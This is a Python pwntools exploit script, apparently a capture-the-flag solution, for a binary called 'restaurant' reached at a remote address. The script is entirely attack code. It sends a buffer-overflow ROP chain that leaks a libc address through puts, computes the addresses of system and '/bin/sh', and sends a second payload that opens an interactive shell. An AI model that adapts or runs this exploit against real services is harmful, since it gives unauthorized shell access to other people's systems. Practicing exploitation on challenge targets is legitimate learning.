from pwn import *

p = process('./restaurant')
p = remote('138.68.129.26',30426)
uu64    = lambda data               :u64(data.ljust(8, '\0'))
#pid = gdb.attach(p, gdbscript="""b * 0x0000000000400ecd""")

offset = "a" * 40

puts_got = 0x0601fa8
puts_plt = 0x00400650

main = 0x00400f68

payload1= offset
payload1 += p64(0x00000000004010a3)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main)

p.sendlineafter('> ', '1')
p.sendlineafter('> ', payload1)
leak2 = p.recvline()
leak = p.recvline()[54:-1]
print len(leak)
print "leak: "
print hex(uu64(leak))
leak = uu64(leak)
print hex(leak)

libc_base = leak -0x000000000080aa0
system = libc_base + 0x00000000004f550
bin_sh = libc_base + 0x1b3e1a
print "libc_base: " + hex(libc_base)
print "bin_sh: " + hex(bin_sh)
print "system: "+ hex(system)

payload2 = offset
payload2 += p64(0x00000000004010a3)
payload2 += p64(bin_sh)
payload2 += p64(0x000000000040063e)
payload2 += p64(system)
#p.sendlineafter('> ', '1')
p.sendlineafter('> ', '1')
p.sendlineafter('> ', payload2)
p.interactive()
